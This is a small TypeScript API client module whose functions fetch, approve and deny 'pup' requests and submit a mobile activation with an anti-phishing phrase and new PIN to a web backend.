export const API =
  "https://www.skodrinon.com"

export type PupRequest =
  any

export async function fetchPupRequests() {
  const res = await fetch(
    `${API}/api/pup/request/list`,
    {
      method: "GET",
      headers: {
        Accept: "application/json",
      },
    }
  )

  if (!res.ok) {
    throw new Error("FETCH_FAILED")
  }

  const data =
    await res.json()

  return data.requests || []
}

export async function approvePupRequest(
  requestId: string
) {
  const res = await fetch(
    `${API}/api/pup/request/approve`,
    {
      method: "POST",
      headers: {
        "Content-Type":
          "application/json",
      },
      body: JSON.stringify({
        requestId,
      }),
    }
  )

  return await res.json()
}

export async function denyPupRequest(
  requestId: string
) {
  const res = await fetch(
    `${API}/api/pup/request/deny`,
    {
      method: "POST",
      headers: {
        "Content-Type":
          "application/json",
      },
      body: JSON.stringify({
        requestId,
      }),
    }
  )

  return await res.json()
}

export async function mobileActivateAndApprove(
  input: {
    requestId: string
    antiPhishing: string
    newPin: string
    repeatPin: string
  }
) {
  const res = await fetch(
    `${API}/api/pup/request/mobile-activate-approve`,
    {
      method: "POST",
      headers: {
        "Content-Type":
          "application/json",
      },
      body: JSON.stringify(input),
    }
  )

  return await res.json()
}